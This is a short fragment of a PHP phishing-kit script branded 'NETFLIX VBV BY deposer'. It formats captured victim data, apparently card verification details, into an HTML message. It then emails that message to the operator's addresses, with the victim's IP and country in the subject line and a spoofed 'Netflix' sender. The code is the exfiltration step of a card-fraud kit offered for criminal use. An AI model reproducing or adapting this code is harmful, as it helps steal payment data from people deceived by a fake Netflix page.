...
################ <font style='color: #820000;'>😈 NETFLIX VBV 😈</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> <[ 😈 NETFLIX VBV BY deposer 😈 ]> </font> ]±±±±±±±±±±±±±±±±±±±±<br>
...
$subject=" 💰 NETFLIX VBV 💰  From [{$_SESSION['ip_countryName']}]  [{$_SESSION['ip']}] ";$headers="From: 😈 Netflix 😈 <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>